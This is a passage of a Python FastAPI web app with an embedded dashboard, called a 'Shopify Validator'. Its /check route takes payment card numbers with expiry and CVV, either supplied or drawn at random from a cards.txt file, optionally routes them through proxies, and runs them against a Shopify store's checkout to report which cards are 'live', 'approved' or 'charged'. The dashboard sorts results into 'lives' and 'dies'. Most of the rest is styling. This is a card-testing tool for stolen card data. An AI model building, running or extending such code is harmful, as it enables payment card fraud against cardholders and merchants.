    _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1

    return JSONResponse(result)


@app.get("/check")
async def check_route(
    site:      str           = Query(..., description="Shopify store URL to check"),
    card:      Optional[str] = Query(None, description="cc|mm|yy|cvv or cc|mm|yyyy|cvv"),
    proxy:     Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
    max_price: Optional[float] = Query(None, description="Max product price override"),
):
    """
    Check if a Shopify store has products under ${MAX_PRICE} and whether
    its payment gateway returns a real (live) response.
    """
    if not site:
        return JSONResponse({"error": "Missing 'site' parameter"}, status_code=400)

    if card:
        parsed = _parse_card(card)
        if not parsed:
            return JSONResponse(
                {"error": "Bad card format. Use cc|mm|yy|cvv or cc|mm|yyyy|cvv"},
                status_code=400,
            )
    else:
        cards = _get_cards()
        if not cards:
            return JSONResponse(
                {"error": "No cards available. Create cards.txt with one cc|mm|yy|cvv per line."},
                status_code=400,
            )
        parsed = random.choice(cards)

    site = site.strip()
    ourl = site if site.startswith("http") else f"https://{site}"

    result = await validate_card(
        parsed["cc"], parsed["month"], parsed["year"], parsed["cvv"],
        ourl, proxy_str=proxy, max_price=max_price,
    )

    response_code = result.get("Response", "")
    _stats[f"response_{response_code or 'UNKNOWN'}"] += 1
    return JSONResponse({
        "valid":         response_code in LIVE_RESPONSES,
        "site":          site,
        "product":       result.get("Product", ""),
        "price":         result.get("Price", "0.00"),
        "card_response": response_code,
        "gate":          result.get("Gate", "UNKNOWN"),
        "approved":      result.get("Approved", "False"),
        "charged":       result.get("Charged", "False"),
        "time":          result.get("Time", ""),
    })


@app.get("/health")
async def health_route():
    cards  = _get_cards()
    return JSONResponse({
        "status":           "ok",
        "cards_loaded":     len(cards),
        "pool_size":        POOL_SIZE,
        "pool_per_host":    POOL_PER_HOST,
        "site_concurrency": SITE_CONCURRENCY,
        "cache_ttl":        CACHE_TTL,
        "max_price":        MAX_PRICE,
    })


@app.get("/stats")
async def stats_route():
    """Return request statistics."""
    return JSONResponse(dict(_stats))


@app.post("/cache/clear")
async def cache_clear_route():
    """Clear the product cache."""
    count = len(_product_cache)
    _product_cache.clear()
    return JSONResponse({"cleared": count})


@app.post("/reload")
async def reload_route():
    """Reload cards from the cards file."""
    _reload_cards()
    return JSONResponse({"cards_loaded": len(_cards_cache)})


INDEX_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shopify Validator — Liquid Glass Suite</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,400;0,600;0,700;1,400&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --glass-1: rgba(255, 255, 255, 0.04);
            --glass-2: rgba(255, 255, 255, 0.06);
            --glass-3: rgba(255, 255, 255, 0.09);
            --glass-tint: rgba(120, 130, 220, 0.05);
            --glass-input: rgba(255, 255, 255, 0.03);
            --glass-input-strong: rgba(255, 255, 255, 0.05);

            --edge-light: rgba(255, 255, 255, 0.22);
            --edge-dim: rgba(255, 255, 255, 0.06);
            --edge-chroma-a: rgba(139, 92, 246, 0.5);
            --edge-chroma-b: rgba(56, 189, 248, 0.45);
            --edge-chroma-c: rgba(244, 114, 182, 0.35);

            --primary: #a5b4fc;
            --primary-strong: #818cf8;
            --primary-deep: #6366f1;
            --primary-glow: rgba(129, 140, 248, 0.55);

            --success: #34d399;
            --success-glow: rgba(52, 211, 153, 0.55);
            --danger: #fb7185;
            --danger-glow: rgba(251, 113, 133, 0.55);
            --warning: #fbbf24;
            --warning-glow: rgba(251, 191, 36, 0.55);
            --info: #22d3ee;
            --info-glow: rgba(34, 211, 238, 0.55);
            --violet: #c4b5fd;
            --violet-glow: rgba(196, 181, 253, 0.55);
            --pink: #f472b6;
            --pink-glow: rgba(244, 114, 182, 0.5);

            --text-main: #f8fafc;
            --text-muted: rgba(226, 232, 240, 0.72);
            --text-dim: rgba(148, 163, 184, 0.55);

            --font-sans: 'Plus Jakarta Sans', sans-serif;
            --font-mono: 'JetBrains Mono', monospace;

            --blur-glass: blur(40px) saturate(200%);
            --blur-card: blur(28px) saturate(180%);
            --blur-soft: blur(16px) saturate(160%);

            --shadow-glass:
                0 8px 32px rgba(0, 0, 0, 0.35),
                0 1px 0 rgba(255, 255, 255, 0.18) inset,
                0 -1px 0 rgba(255, 255, 255, 0.04) inset,
                0 0 0 1px rgba(255, 255, 255, 0.06) inset;
            --shadow-lift:
                0 20px 60px rgba(0, 0, 0, 0.5),
                0 1px 0 rgba(255, 255, 255, 0.22) inset,
                0 0 0 1px rgba(255, 255, 255, 0.08) inset;
        }

        * { box-sizing: border-box; margin: 0; padding: 0; }

        html { scroll-behavior: smooth; }

        body {
            font-family: var(--font-sans);
            background: #030308;
            color: var(--text-main);
            min-height: 100vh;
            padding: 1.6rem;
            display: flex;
            justify-content: center;
            position: relative;
            overflow-x: hidden;
            -webkit-font-smoothing: antialiased;
            isolation: isolate;
        }

        /* ============================================
           ANIMATED LIQUID COLOR FIELD
           Multiple animated orbs + rotating hue mesh
           ============================================ */
        body::before {
            content: '';
            position: fixed;
            inset: -30%;
            background:
                radial-gradient(38% 32% at 18% 22%, rgba(139, 92, 246, 0.55) 0%, transparent 65%),
                radial-gradient(34% 30% at 82% 18%, rgba(56, 189, 248, 0.45) 0%, transparent 65%),
                radial-gradient(40% 38% at 72% 82%, rgba(244, 114, 182, 0.42) 0%, transparent 68%),
                radial-gradient(36% 34% at 12% 78%, rgba(34, 211, 238, 0.36) 0%, transparent 66%),
                radial-gradient(50% 45% at 50% 50%, rgba(99, 102, 241, 0.28) 0%, transparent 70%);
            filter: blur(70px);
            z-index: -3;
            animation: liquidFlow 30s ease-in-out infinite alternate;
            will-change: transform;
        }

        /* Secondary counter-drifting layer for depth */
        body::after {
            content: '';
            position: fixed;
            inset: -20%;
            background:
                radial-gradient(28% 24% at 60% 12%, rgba(168, 85, 247, 0.35) 0%, transparent 62%),
                radial-gradient(30% 26% at 30% 88%, rgba(14, 165, 233, 0.32) 0%, transparent 64%),
                radial-gradient(26% 22% at 88% 62%, rgba(236, 72, 153, 0.28) 0%, transparent 62%);
            filter: blur(90px);
            z-index: -2;
            animation: liquidFlow2 22s ease-in-out infinite alternate;
            will-change: transform;
            mix-blend-mode: screen;
        }

        @keyframes liquidFlow {
            0%   { transform: translate3d(0, 0, 0) scale(1) rotate(0deg); }
            50%  { transform: translate3d(-3%, 2%, 0) scale(1.08) rotate(2deg); }
            100% { transform: translate3d(2%, -2%, 0) scale(1.04) rotate(-2deg); }
        }
        @keyframes liquidFlow2 {
            0%   { transform: translate3d(0, 0, 0) scale(1.02); }
            50%  { transform: translate3d(3%, -2%, 0) scale(1.1); }
            100% { transform: translate3d(-2%, 2%, 0) scale(1.05); }
        }

        /* Subtle grain so glass reads as physical, not flat */
        .grain-overlay {
            position: fixed;
            inset: 0;
            pointer-events: none;
            z-index: 0;
            opacity: 0.35;
            mix-blend-mode: overlay;
            background-image:
                repeating-linear-gradient(0deg, rgba(255,255,255,0.012) 0 1px, transparent 1px 2px),
                repeating-linear-gradient(90deg, rgba(255,255,255,0.008) 0 1px, transparent 1px 2px);
        }

        .dashboard {
            width: 100%;
            max-width: 1380px;
            display: flex;
            flex-direction: column;
            gap: 1.3rem;
            position: relative;
            z-index: 1;
        }

        /* ============================================
           LIQUID GLASS PRIMITIVE
           ============================================ */
        .glass {
            position: relative;
            background: linear-gradient(135deg, var(--glass-2), var(--glass-1));
            backdrop-filter: var(--blur-card);
            -webkit-backdrop-filter: var(--blur-card);
            border: 1px solid var(--edge-dim);
            border-radius: 20px;
            box-shadow: var(--shadow-glass);
            overflow: hidden;
            isolation: isolate;
        }

        /* Top specular sheen */
        .glass::before {
            content: '';
            position: absolute;
            inset: 0;
            border-radius: inherit;
            background:
                linear-gradient(180deg, rgba(255, 255, 255, 0.12) 0%, transparent 30%),
                linear-gradient(135deg, rgba(255, 255, 255, 0.06) 0%, transparent 55%);
            pointer-events: none;
            z-index: 1;
        }

        /* Chromatic edge glow */
        .glass::after {
            content: '';
            position: absolute;
            inset: -1px;
            border-radius: inherit;
            padding: 1px;
            background:
                linear-gradient(135deg,
                    rgba(139, 92, 246, 0.5) 0%,
                    rgba(56, 189, 248, 0.35) 30%,
                    transparent 50%,
                    rgba(244, 114, 182, 0.4) 80%,
                    rgba(139, 92, 246, 0.4) 100%);
            -webkit-mask:
                linear-gradient(#000 0 0) content-box,
                linear-gradient(#000 0 0);
            -webkit-mask-composite: xor;
            mask-composite: exclude;
            pointer-events: none;
            z-index: 2;
            opacity: 0.85;
        }

        /* ============================================
           TOP BAR
           ============================================ */
        .top-bar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 1.15rem 1.6rem;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.07), rgba(255, 255, 255, 0.025));
            backdrop-filter: var(--blur-glass);
            -webkit-backdrop-filter: var(--blur-glass);
            border: 1px solid var(--edge-dim);
            border-radius: 20px;
            box-shadow: var(--shadow-glass);
            position: relative;
            overflow: hidden;
            isolation: isolate;
        }

        .top-bar::before {
            content: '';
            position: absolute;
            top: -50%; left: -20%;
            width: 60%; height: 200%;
            background: linear-gradient(115deg, transparent 40%, rgba(255, 255, 255, 0.09) 50%, transparent 60%);
            transform: rotate(8deg);
            animation: sheen 8s ease-in-out infinite;
            pointer-events: none;
        }

        @keyframes sheen {
            0%, 100% { transform: translateX(-40%) rotate(8deg); opacity: 0; }
            50%      { transform: translateX(60%) rotate(8deg); opacity: 1; }
        }

        .top-bar::after {
            content: '';
            position: absolute;
            bottom: 0; left: 10%; right: 10%;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(196, 181, 253, 0.7), rgba(34, 211, 238, 0.6), rgba(244, 114, 182, 0.6), transparent);
            filter: blur(0.5px);
        }

        .brand { display: flex; align-items: center; gap: 1rem; position: relative; z-index: 2; }

        .brand-icon {
            width: 48px; height: 48px;
            background:
                linear-gradient(135deg, rgba(139, 92, 246, 0.9), rgba(56, 189, 248, 0.85) 50%, rgba(244, 114, 182, 0.85));
            border-radius: 14px;
            display: flex; align-items: center; justify-content: center;
            font-size: 1.5rem;
            position: relative;
            box-shadow:
                0 0 32px rgba(139, 92, 246, 0.65),
                0 0 60px rgba(56, 189, 248, 0.35),
                inset 0 1px 0 rgba(255, 255, 255, 0.5),
                inset 0 -8px 20px rgba(0, 0, 0, 0.35);
            animation: iconPulse 4s ease-in-out infinite;
        }

        @keyframes iconPulse {
            0%, 100% { box-shadow: 0 0 32px rgba(139, 92, 246, 0.65), 0 0 60px rgba(56, 189, 248, 0.35), inset 0 1px 0 rgba(255,255,255,0.5), inset 0 -8px 20px rgba(0,0,0,0.35); }
            50%      { box-shadow: 0 0 46px rgba(139, 92, 246, 0.85), 0 0 90px rgba(56, 189, 248, 0.55), inset 0 1px 0 rgba(255,255,255,0.6), inset 0 -8px 20px rgba(0,0,0,0.35); }
        }

        .brand-icon::before {
            content: '';
            position: absolute;
            inset: 2px;
            border-radius: 12px;
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.4), transparent 55%);
            pointer-events: none;
        }

        .brand-title h1 {
            font-size: 1.28rem;
            font-weight: 800;
            letter-spacing: -0.02em;
            background: linear-gradient(90deg, #ffffff 0%, #c7d2fe 40%, #a5f3fc 70%, #fbcfe8 100%);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 30px rgba(196, 181, 253, 0.3);
        }

        .brand-title p {
            font-size: 0.78rem;
            color: var(--text-muted);
            margin-top: 2px;
            letter-spacing: 0.01em;
        }

        .sys-info { display: flex; gap: 0.8rem; position: relative; z-index: 2; }

        .sys-chip {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.09), rgba(255, 255, 255, 0.03));
            backdrop-filter: var(--blur-soft);
            -webkit-backdrop-filter: var(--blur-soft);
            border: 1px solid var(--edge-dim);
            padding: 0.5rem 1rem;
            border-radius: 12px;
            font-size: 0.78rem;
            font-family: var(--font-mono);
            display: flex; align-items: center; gap: 0.5rem;
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.15),
                inset 0 -1px 0 rgba(255, 255, 255, 0.03),
                0 4px 16px rgba(0, 0, 0, 0.25);
            transition: all 0.25s ease;
            position: relative;
            overflow: hidden;
        }

        .sys-chip::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 50%;
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.08), transparent);
            pointer-events: none;
        }

        .sys-chip:hover {
            border-color: rgba(196, 181, 253, 0.4);
            transform: translateY(-1px);
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.2),
                0 8px 24px rgba(139, 92, 246, 0.25);
        }

        .sys-chip .val {
            font-weight: 700;
            color: var(--violet);
            text-shadow: 0 0 14px var(--violet-glow);
        }

        /* ============================================
           MAIN CARD
           ============================================ */
        .main-card {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.06), rgba(255, 255, 255, 0.02));
            backdrop-filter: var(--blur-glass);
            -webkit-backdrop-filter: var(--blur-glass);
            border: 1px solid var(--edge-dim);
            border-radius: 24px;
            padding: 1.5rem;
            display: flex; flex-direction: column; gap: 1.4rem;
            box-shadow: var(--shadow-glass);
            position: relative;
            overflow: hidden;
            isolation: isolate;
        }

        .main-card::before {
            content: '';
            position: absolute;
            top: -60%; left: -30%;
            width: 50%; height: 220%;
            background: linear-gradient(115deg, transparent 45%, rgba(255, 255, 255, 0.07) 50%, transparent 55%);
            transform: rotate(10deg);
            animation: sheen 12s ease-in-out infinite;
            pointer-events: none;
            z-index: 1;
        }

        .main-card::after {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(196, 181, 253, 0.65), rgba(34, 211, 238, 0.5), rgba(244, 114, 182, 0.55), transparent);
            filter: blur(0.4px);
        }

        .main-card > * { position: relative; z-index: 2; }

        .input-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 1.3rem;
        }

        @media (max-width: 900px) { .input-grid { grid-template-columns: 1fr; } }

        .input-box { display: flex; flex-direction: column; gap: 0.6rem; }

        .input-box label {
            font-size: 0.83rem;
            font-weight: 700;
            color: var(--text-muted);
            display: flex;
            justify-content: space-between;
            align-items: center;
            letter-spacing: 0.01em;
        }

        .input-box label span button {
            background: linear-gradient(135deg, rgba(139, 92, 246, 0.18), rgba(56, 189, 248, 0.12));
            border: 1px solid rgba(196, 181, 253, 0.3);
            color: var(--violet);
            padding: 3px 10px;
            border-radius: 8px;
            font-size: 0.7rem;
            cursor: pointer;
            font-weight: 700;
            transition: all 0.2s ease;
            font-family: var(--font-sans);
        }

        .input-box label span button:hover {
            background: linear-gradient(135deg, rgba(139, 92, 246, 0.32), rgba(56, 189, 248, 0.22));
            box-shadow: 0 0 20px rgba(139, 92, 246, 0.35);
            transform: translateY(-1px);
        }

        textarea {
            width: 100%;
            height: 180px;
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.04), rgba(255, 255, 255, 0.02));
            backdrop-filter: var(--blur-soft);
            -webkit-backdrop-filter: var(--blur-soft);
            border: 1px solid var(--edge-dim);
            border-radius: 14px;
            padding: 0.95rem 1.05rem;
            color: var(--text-main);
            font-family: var(--font-mono);
            font-size: 0.875rem;
            line-height: 1.65;
            resize: vertical;
            transition: all 0.25s ease;
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.1),
                inset 0 -1px 0 rgba(255, 255, 255, 0.02),
                inset 0 0 20px rgba(139, 92, 246, 0.03);
        }

        textarea::placeholder { color: var(--text-dim); }

        textarea:focus, input:focus, select:focus {
            outline: none;
            border-color: rgba(196, 181, 253, 0.55);
            box-shadow:
                0 0 0 4px rgba(139, 92, 246, 0.15),
                0 0 30px rgba(139, 92, 246, 0.22),
                inset 0 1px 0 rgba(255, 255, 255, 0.14);
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.06), rgba(255, 255, 255, 0.03));
        }

        /* ============================================
           TOOLBAR
           ============================================ */
        .toolbar {
            display: flex; justify-content: center; align-items: center;
            gap: 0.8rem; flex-wrap: wrap;
        }

        .btn-action {
            cursor: pointer;
            padding: 0.85rem 1.8rem;
            border-radius: 14px;
            border: 1px solid var(--edge-dim);
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.09), rgba(255, 255, 255, 0.03));
            backdrop-filter: var(--blur-soft);
            -webkit-backdrop-filter: var(--blur-soft);
            color: var(--text-main);
            font-family: var(--font-sans);
            font-weight: 700;
            font-size: 0.85rem;
            display: inline-flex; align-items: center; justify-content: center;
            gap: 0.5rem;
            transition: all 0.22s cubic-bezier(0.34, 1.56, 0.64, 1);
            text-transform: uppercase;
            letter-spacing: 0.06em;
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.15),
                inset 0 -1px 0 rgba(255, 255, 255, 0.03),
                0 6px 20px rgba(0, 0, 0, 0.3);
            position: relative;
            overflow: hidden;
        }

        .btn-action::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 50%;
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.1), transparent);
            pointer-events: none;
        }

        .btn-action:hover:not(:disabled) {
            transform: translateY(-3px) scale(1.02);
            border-color: rgba(196, 181, 253, 0.45);
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.22),
                0 14px 40px rgba(139, 92, 246, 0.3),
                0 0 40px rgba(139, 92, 246, 0.15);
        }

        .btn-action:active:not(:disabled) { transform: translateY(-1px) scale(1); }

        .btn-start {
            background: linear-gradient(135deg, rgba(139, 92, 246, 0.32), rgba(56, 189, 248, 0.22));
            border-color: rgba(196, 181, 253, 0.5);
            color: #ffffff;
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.28),
                inset 0 -1px 0 rgba(255, 255, 255, 0.05),
                0 6px 24px rgba(139, 92, 246, 0.4),
                0 0 60px rgba(139, 92, 246, 0.18);
            text-shadow: 0 0 20px rgba(196, 181, 253, 0.5);
        }

        .btn-start:hover:not(:disabled) {
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.35),
                0 16px 48px rgba(139, 92, 246, 0.55),
                0 0 80px rgba(56, 189, 248, 0.3);
        }

        .btn-pause {
            background: linear-gradient(135deg, rgba(251, 191, 36, 0.28), rgba(146, 64, 14, 0.22));
            border-color: rgba(251, 191, 36, 0.45);
            color: #fde68a;
            text-shadow: 0 0 20px var(--warning-glow);
        }

        .btn-cancel {
            background: linear-gradient(135deg, rgba(251, 113, 133, 0.28), rgba(127, 29, 29, 0.22));
            border-color: rgba(251, 113, 133, 0.45);
            color: #fecdd3;
            text-shadow: 0 0 20px var(--danger-glow);
        }

        .btn-action:disabled { opacity: 0.35; cursor: not-allowed; transform: none !important; }

        /* ============================================
           CONFIG STRIP
           ============================================ */
        .config-strip {
            display: flex; justify-content: center; align-items: center;
            gap: 1rem; flex-wrap: wrap;
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.05), rgba(255, 255, 255, 0.015));
            backdrop-filter: var(--blur-card);
            -webkit-backdrop-filter: var(--blur-card);
            border: 1px solid var(--edge-dim);
            padding: 0.9rem 1.35rem;
            border-radius: 16px;
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.1),
                inset 0 -1px 0 rgba(255, 255, 255, 0.02);
        }

        .config-item {
            display: flex; align-items: center; gap: 0.6rem;
            font-size: 0.825rem;
            color: var(--text-muted);
            font-weight: 600;
        }

        .config-item select, .config-item input {
            width: auto;
            padding: 0.55rem 0.95rem;
            font-size: 0.8rem;
            border-radius: 10px;
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.06), rgba(255, 255, 255, 0.02));
            backdrop-filter: var(--blur-soft);
            -webkit-backdrop-filter: var(--blur-soft);
            border: 1px solid var(--edge-dim);
            color: var(--text-main);
            font-family: var(--font-sans);
            cursor: pointer;
            transition: all 0.22s ease;
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.1),
                inset 0 -1px 0 rgba(255, 255, 255, 0.02);
        }

        .config-item select:hover, .config-item input:hover {
            border-color: rgba(196, 181, 253, 0.4);
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.09), rgba(255, 255, 255, 0.03));
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.16),
                0 0 24px rgba(139, 92, 246, 0.2);
        }

        .config-item select option { background: #0b0c14; color: var(--text-main); }

        /* ============================================
           TABS
           ============================================ */
        .tabs-nav {
            display: flex; gap: 2rem;
            border-bottom: 1px solid var(--edge-dim);
            padding-bottom: 0.65rem;
            margin-top: 0.5rem;
        }

        .tab-item {
            cursor: pointer;
            font-size: 0.92rem; font-weight: 800;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            padding: 0.5rem 0.3rem;
            color: var(--text-dim);
            position: relative;
            transition: all 0.22s ease;
        }

        .tab-item:hover { color: var(--text-muted); transform: translateY(-1px); }
        .tab-item.active { color: var(--text-main); }

        .tab-item.active::after {
            content: '';
            position: absolute;
            bottom: -0.7rem;
            left: 0;
            width: 100%;
            height: 3px;
            border-radius: 3px;
        }

        .tab-item.tab-lives.active { color: var(--success); text-shadow: 0 0 20px var(--success-glow); }
        .tab-item.tab-lives.active::after {
            background: linear-gradient(90deg, var(--success), #a7f3d0);
            box-shadow: 0 0 20px var(--success-glow), 0 0 40px var(--success-glow);
        }

        .tab-item.tab-dies.active { color: var(--danger); text-shadow: 0 0 20px var(--danger-glow); }
        .tab-item.tab-dies.active::after {
            background: linear-gradient(90deg, var(--danger), #fecdd3);
            box-shadow: 0 0 20px var(--danger-glow), 0 0 40px var(--danger-glow);
        }

        .tab-item.tab-errors.active { color: var(--warning); text-shadow: 0 0 20px var(--warning-glow); }
        .tab-item.tab-errors.active::after {
            background: linear-gradient(90deg, var(--warning), #fde68a);
            box-shadow: 0 0 20px var(--warning-glow), 0 0 40px var(--warning-glow);
        }

        /* ============================================
           COUNTERS
           ============================================ */
        .counters-strip {
            display: grid;
            grid-template-columns: repeat(8, 1fr);
            gap: 0.8rem;
        }

        @media (max-width: 1024px) { .counters-strip { grid-template-columns: repeat(4, 1fr); } }
        @media (max-width: 600px) { .counters-strip { grid-template-columns: repeat(2, 1fr); } }

        .counter-card {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.07), rgba(255, 255, 255, 0.02));
            backdrop-filter: var(--blur-card);
            -webkit-backdrop-filter: var(--blur-card);
            border: 1px solid var(--edge-dim);
            border-radius: 14px;
            padding: 0.95rem 0.55rem;
            text-align: center;
            display: flex; flex-direction: column; gap: 0.4rem;
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.12),
                inset 0 -1px 0 rgba(255, 255, 255, 0.02),
                0 4px 16px rgba(0, 0, 0, 0.25);
            transition: all 0.28s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative;
            overflow: hidden;
        }

        .counter-card::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 50%;
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.08), transparent);
            pointer-events: none;
        }

        .counter-card:hover {
            transform: translateY(-4px);
            border-color: rgba(196, 181, 253, 0.4);
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.2),
                0 12px 36px rgba(139, 92, 246, 0.28);
        }

        .counter-lbl {
            font-size: 0.68rem; font-weight: 800;
            color: var(--text-muted);
            text-transform: uppercase;
            letter-spacing: 0.09em;
            position: relative;
            z-index: 2;
        }

        .counter-num {
            font-size: 1.45rem; font-weight: 800;
            font-family: var(--font-mono);
            letter-spacing: -0.02em;
            position: relative;
            z-index: 2;
            transition: text-shadow 0.3s ease;
        }

        .counter-num.totales { color: var(--text-main); text-shadow: 0 0 20px rgba(255,255,255,0.25); }
        .counter-num.procesados { color: var(--info); text-shadow: 0 0 20px var(--info-glow); }
        .counter-num.pendientes { color: var(--warning); text-shadow: 0 0 20px var(--warning-glow); }
        .counter-num.lives { color: var(--success); text-shadow: 0 0 24px var(--success-glow), 0 0 50px var(--success-glow); }
        .counter-num.dies { color: var(--danger); text-shadow: 0 0 20px var(--danger-glow); }
        .counter-num.errores { color: var(--warning); text-shadow: 0 0 20px var(--warning-glow); }
        .counter-num.tiempo { color: var(--violet); text-shadow: 0 0 20px var(--violet-glow); }
        .counter-num.restante { color: var(--pink); text-shadow: 0 0 20px var(--pink-glow); }

        /* ============================================
           DEBUG MONITOR
           ============================================ */
        .debug-monitor {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.05), rgba(255, 255, 255, 0.015));
            backdrop-filter: var(--blur-card);
            -webkit-backdrop-filter: var(--blur-card);
            border: 1px solid var(--edge-dim);
            border-radius: 14px;
            padding: 0.85rem 1.35rem;
            font-family: var(--font-mono);
            font-size: 0.825rem;
            color: var(--text-muted);
            display: flex; align-items: center; justify-content: space-between;
            margin-bottom: 1.3rem;
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.1),
                inset 0 -1px 0 rgba(255, 255, 255, 0.02);
        }

        .debug-monitor .badge {
            background: linear-gradient(135deg, rgba(139, 92, 246, 0.85), rgba(56, 189, 248, 0.75));
            color: #fff;
            padding: 4px 11px;
            border-radius: 8px;
            font-weight: 800;
            font-size: 0.68rem;
            text-transform: uppercase;
            letter-spacing: 0.08em;
            box-shadow:
                0 0 20px rgba(139, 92, 246, 0.55),
                inset 0 1px 0 rgba(255, 255, 255, 0.35);
            text-shadow: 0 0 12px rgba(255, 255, 255, 0.35);
        }

        /* ============================================
           OUTPUT
           ============================================ */
        .output-section { display: flex; flex-direction: column; gap: 0.85rem; }
        .output-actions { display: flex; justify-content: flex-end; gap: 0.8rem; flex-wrap: wrap; }

        .btn-glass {
            border: 1px solid var(--edge-dim);
            padding: 0.7rem 1.5rem;
            border-radius: 14px;
            font-weight: 800;
            font-size: 0.83rem;
            cursor: pointer;
            display: inline-flex; align-items: center; gap: 0.5rem;
            text-transform: uppercase;
            letter-spacing: 0.06em;
            backdrop-filter: var(--blur-soft);
            -webkit-backdrop-filter: var(--blur-soft);
            transition: all 0.22s cubic-bezier(0.34, 1.56, 0.64, 1);
            position: relative;
            overflow: hidden;
            font-family: var(--font-sans);
            color: var(--text-main);
        }

        .btn-glass::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0;
            height: 50%;
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.12), transparent);
            pointer-events: none;
        }

        .btn-glass:hover { transform: translateY(-3px) scale(1.02); }

        .btn-glass-green {
            background: linear-gradient(135deg, rgba(52, 211, 153, 0.35), rgba(16, 185, 129, 0.22));
            border-color: rgba(52, 211, 153, 0.55);
            color: #d1fae5;
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.3),
                0 6px 24px rgba(52, 211, 153, 0.4),
                0 0 60px rgba(52, 211, 153, 0.18);
            text-shadow: 0 0 18px var(--success-glow);
        }
        .btn-glass-green:hover {
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.4),
                0 16px 48px rgba(52, 211, 153, 0.55),
                0 0 80px rgba(52, 211, 153, 0.3);
        }

        .btn-glass-violet {
            background: linear-gradient(135deg, rgba(196, 181, 253, 0.28), rgba(139, 92, 246, 0.2));
            border-color: rgba(196, 181, 253, 0.5);
            color: #ede9fe;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.25), 0 6px 20px rgba(139, 92, 246, 0.3);
        }

        .btn-glass-amber {
            background: linear-gradient(135deg, rgba(251, 191, 36, 0.28), rgba(146, 64, 14, 0.2));
            border-color: rgba(251, 191, 36, 0.5);
            color: #fef3c7;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.25), 0 6px 20px rgba(251, 191, 36, 0.3);
            text-shadow: 0 0 16px var(--warning-glow);
        }

        .btn-glass-rose {
            background: linear-gradient(135deg, rgba(251, 113, 133, 0.28), rgba(127, 29, 29, 0.2));
            border-color: rgba(251, 113, 133, 0.5);
            color: #ffe4e6;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.25), 0 6px 20px rgba(251, 113, 133, 0.3);
            text-shadow: 0 0 16px var(--danger-glow);
        }

        .btn-glass-cyan {
            background: linear-gradient(135deg, rgba(34, 211, 238, 0.28), rgba(8, 145, 178, 0.2));
            border-color: rgba(34, 211, 238, 0.5);
            color: #cffafe;
            box-shadow: inset 0 1px 0 rgba(255, 255, 255, 0.25), 0 6px 20px rgba(34, 211, 238, 0.3);
            text-shadow: 0 0 16px var(--info-glow);
        }

        .output-textarea {
            width: 100%;
            height: 240px;
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.04), rgba(255, 255, 255, 0.015));
            backdrop-filter: var(--blur-soft);
            -webkit-backdrop-filter: var(--blur-soft);
            border: 1px solid var(--edge-dim);
            border-radius: 14px;
            padding: 1.05rem;
            color: var(--text-main);
            font-family: var(--font-mono);
            font-size: 0.85rem;
            line-height: 1.65;
            resize: vertical;
            box-shadow:
                inset 0 1px 0 rgba(255, 255, 255, 0.08),
                inset 0 -1px 0 rgba(255, 255, 255, 0.02),
                inset 0 0 30px rgba(139, 92, 246, 0.03);
        }

        /* ============================================
           TABLE
           ============================================ */
        .table-area {
            overflow-x: auto;
            border: 1px solid var(--edge-dim);
            border-radius: 16px;
            background: linear-gradient(180deg, rgba(255, 255, 255, 0.04), rgba(255, 255, 255, 0.01));
            backdrop-filter: var(--blur-card);
            -webkit-backdrop-filter: var(--blur-card);
            margin-top: 0.6rem;
            box-shadow:
